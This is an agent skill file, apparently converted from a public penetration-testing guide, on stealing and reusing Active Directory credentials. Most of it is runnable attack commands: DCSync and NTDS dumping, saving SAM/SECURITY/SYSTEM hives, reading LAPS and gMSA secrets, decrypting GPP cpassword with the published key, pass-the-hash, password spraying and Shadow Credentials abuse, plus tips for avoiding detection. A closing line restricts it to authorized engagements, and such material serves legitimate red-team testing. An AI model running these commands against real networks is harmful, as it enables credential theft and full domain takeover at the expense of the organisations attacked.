---
name: active-directory-credentials
description: >-
  Steal and abuse Active Directory credentials: LSASS, SAM and NTDS.dit dumping, hash capture and
  cracking, pass-the-hash, pass-the-key, overpass-the-hash, password spraying, GPP cpassword,
  LAPS, gMSA and dMSA, DSRM, passwords in user comments, pre-created computer accounts and Shadow
  Credentials (msDS-KeyCredentialLink). Use when you need credentials or hashes from a host or the
  domain, when planning a password spray, when you find a readable attribute or policy containing
  secrets, or when converting recovered material into a usable session.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "14"
  generated-by: build/build.py
---

# Active Directory Credential Theft and Reuse

Credentials in AD live at four levels: host-local secrets (SAM, LSA, DSRM), the domain database
(NTDS via DCSync or VSS), attributes (LAPS, gMSA, dMSA, comments, GPP), and guesses (spraying). The
second half is conversion — an NT hash is not access until it is a session or a TGT.

## When to use this skill

- You have local admin or SYSTEM on a host, or DA/EA on the domain, and want every credential.
- You already hold a credential and need to convert it: hash→session, hash→TGT, hash→cracked text.
- Enumeration showed a secret-bearing attribute (`ms-mcs-AdmPwd`, `msDS-ManagedPassword`,
  `description`, `cpassword`) or a write edge over an account you want to become.
- You need to test password policy by spraying, without locking out the engagement.

For what to do with a TGT once you have one (roasting, delegation, forged tickets), see
`active-directory-kerberos`. For certificate-based identity theft (Shadow Credentials is also the
first step of ESC9/ESC10), see `active-directory-certificates`. For finding the write edges and
readable attributes in the first place, see `active-directory-enumeration`.

## First moves

1. **Domain-wide: DCSync.** Requires Domain Admin, Enterprise Admin, Administrators, or a DC
   machine account — nothing else grants replication rights:

   ```bash
   netexec smb 10.10.10.10 -u username -p password --ntds
   netexec smb 10.10.10.10 -u username -p password --ntds drsuapi
   ```

   `mimikatz lsadump::dcsync /domain:htb.local /user:krbtgt` if you are already on a Windows host.

2. **Host-local: SAM + LSA + SYSTEM hives** (offline extraction, no DCSync signature):

   ```powershell
   reg.exe save hklm\sam c:\temp\sam.save
   reg.exe save hklm\security c:\temp\security.save
   reg.exe save hklm\system c:\temp\system.save
   ```

   ```bash
   secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
   ```

3. **Attribute secrets: LAPS and gMSA.** Both are single LDAP reads *if* the ACL allows it:

   ```bash
   nxc ldap 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps
   netexec ldap 10.10.10.10 -u user -p pass --gmsa
   ```

4. **Policy secrets: GPP cpassword in SYSVOL.** Readable by every authenticated user if present,
   and the AES key is published by Microsoft:

   ```powershell
   findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
   ```

   ```bash
   echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d -aes-256-cbc \
     -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
   ```

5. **Convert a hash into a session** — full NT hash, with the blank LM half if the tool needs it:

   ```bash
   nxc smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
   ```

   Look for `Pwn3d!` — a valid hash that is not privileged on that host authenticates but fails
   the command.

6. **Spray one password across many users** — check the lockout threshold first, and note that the
   built-in Administrator (RID 500) never locks out:

   ```bash
   nxc smb 10.0.0.1 -u /path/to/users.txt -p Password123
   ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
   ```

7. **Write edge over an account → Shadow Credentials**, which yields a TGT without touching the
   password:

   ```bash
   certipy shadow auto -username John@corp.local -p Passw0rd -account Jane
   bloodyAD --host 10.10.10.10 -u username -p 'P@ssw0rd' -d domain.lab add shadowCredentials targetpc$
   ```

## Reference map

| Reference | Read it when | Key content |
|---|---|---|
| [ntds-dumping.md](references/ntds-dumping.md) | you have DA/EA or DC access and want the whole domain | DCSync (`--ntds`, `--ntds drsuapi`), VSS/ntdsutil, forensic-tool extraction, `secretsdump LOCAL`, ADAM, hashcat `-m 1000`, reversible encryption |
| [hash-capture-and-cracking.md](references/hash-capture-and-cracking.md) | you need to capture challenge/response traffic or crack what you have | mode table (3000/1000/5500/5600/2100), LmCompatibilityLevel, NTLMv1 downgrade + shuck.sh, NTLMv2 capture |
| [pass-the-hash.md](references/pass-the-hash.md) | you hold an NT hash and want a session | `nxc -H`, impacket `-hashes`, `sekurlsa::pth` + restricted-admin RDP, SAM extraction |
| [pass-the-key.md](references/pass-the-key.md) | you hold an AES key instead of an NT hash | enctype table (RC4/AES128/AES256), `ticketer -aesKey`, `getTGT.py -aesKey`, Rubeus `/aes256` |
| [overpass-the-hash.md](references/overpass-the-hash.md) | you need a TGT from an NT hash | `getTGT.py -hashes`, ktutil/kinit, `Rubeus asktgt /rc4 /ptt /createnetonly` |
| [password-spraying.md](references/password-spraying.md) | you are guessing and must not lock accounts out | candidate password patterns, nxc multi-protocol spray, BadPwdCount check, kerbrute (4771 vs 4625) |
| [gpp-passwords.md](references/gpp-passwords.md) | SYSVOL is readable and GPOs are old | `findstr cpassword`, openssl AES decrypt, Get-GPPPassword, nxc `gpp_password`/`gpp_autologin` |
| [laps.md](references/laps.md) | `ms-mcs-AdmPwd` exists and you may have delegated read | LAPS detection, `nxc -M laps`, pyLAPS/LAPSDumper, LAPS ADM/READ group abuse via Account Operators |
| [gmsa.md](references/gmsa.md) | a `msDS-GroupManagedServiceAccount` object exists | `msDS-ManagedPassword` blob, `nxc --gmsa`, GMSA ID conversion, Golden GMSA with KDS root key |
| [dmsa.md](references/dmsa.md) | the forest runs Server 2025 DCs and you can write on an OU | BadSuccessor (`msDS-ManagedAccountPrecededByLink`), SharpSuccessor, KERB-DMSA-KEY-PACKAGE RC4 dump |
| [shadow-credentials.md](references/shadow-credentials.md) | you can write `msDS-KeyCredentialLink` on the target | prereqs (DC 2016+, AD CS, PKINIT), Certipy/Whisker/pywhisker, relaying, RBCD takeover |
| [user-comments.md](references/user-comments.md) | cheap win: scan attributes before anything else | attribute filters (`userPassword`, `unicodePwd`, `description`), `-M user-desc`, ldapdomaindump |
| [dsrm.md](references/dsrm.md) | you are on a DC and want its local Administrator | `lsadump::sam`, `DsrmAdminLogonBehavior = 2` registry change |
| [precreated-computer.md](references/precreated-computer.md) | machine accounts exist with default passwords | pre-Win2000 password = lowercase account name, `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`, `rpcchangepwd.py`, `-M pre2K` |

## Workflow

1. **Pick the level before picking the tool.** Do you have host admin (SAM/LSA), domain admin
   (NTDS), only LDAP read (attributes/GPP), or nothing but a user list (spray)? Each answer maps to
   a different reference and a different detection profile.
2. **Check the cheap attribute wins first** — `description`, `cpassword` in SYSVOL, LAPS, gMSA,
   pre-created computer accounts.
3. **Host admin → local secrets.** Dump SAM/LSA/SYSTEM and parse offline. On a DC prefer a VSS copy
   or `ntdsutil` over the live database; DSRM is a second local Administrator.
4. **Domain admin → NTDS.** `--ntds` (drsuapi) or `mimikatz lsadump::dcsync`. Grab `krbtgt` first
   (it unlocks golden tickets in `active-directory-kerberos`), then machine accounts (silver
   tickets, RBCD), then service accounts.
5. **Write edge over an account → identity theft.** Shadow Credentials (needs DC 2016+, AD CS and
   PKINIT) or, on a Server 2025 forest, BadSuccessor dMSA. Both are quieter than resetting the
   password and both leave an artifact you must remove.
6. **Convert, don't just collect.** NT hash → `nxc -H`; hash → TGT via `getTGT.py -hashes` or
   `Rubeus asktgt /rc4`; AES key → `getTGT.py -aesKey`; NetNTLMv1 → shuck to NT hash first.
7. **Only then crack or spray:** cracking serves reporting and reuse, not access.

## Gotchas

- Since Vista, pass-the-hash works against local admin accounts **only for the built-in RID 500**;
  a custom local admin's hash will not authenticate.
- DCSync replication normally happens computer-to-computer; a DCSync initiated by a user account is
  an outlier detection. `--ntds drsuapi` and a VSS copy have different signatures — choose
  deliberately.
- `ms-mcs-AdmPwd` is a *confidential* attribute: Authenticated Users cannot read it by default,
  so enumeration alone does not mean you can read LAPS. Look for delegated rights, or abuse
  Account Operators to join `LAPS ADM`/`LAPS READ`.
- gMSA passwords rotate every 30 days and cannot be force-reset; read access is governed by
  `msDS-GroupMSAMembership`. A compromised KDS root key cannot be rotated at all, so Golden GMSA
  survives remediation of the gMSA itself.
- Shadow Credentials have three silent prerequisites: a 2016+ DC, an AD CS CA, and PKINIT. User
  objects cannot edit their own `msDS-KeyCredentialLink`; a computer can only add one if none
  exists.
- Pre-created computer accounts authenticate with `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` — that
  is expected, not a failure; change the password with `rpcchangepwd.py` before use. The same error
  appears whenever the machine account name equals its password.
- NetNTLMv1 with ESS/SSP produces a different final challenge, so it is not the free `1122334455667788`
  crack — try shuck.sh against HIBP before paying for a crack.
- DSRM credentials are useless remotely until `DsrmAdminLogonBehavior` is set to `2`; that registry
  change is persistent and easy to find, so revert it.
- `secretsdump` prints **cleartext** passwords for accounts with `UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED`
  (UAC `0x80`) — filter for it before spending time cracking.

## Authorized use

For authorized engagements only, with explicit permission and within the agreed scope. Credential
extraction is highly intrusive and often regulated — do not dump more than the engagement needs,
and store recovered secrets securely.

## Source

Converted from the upstream InternalAllTheThings guides
(https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
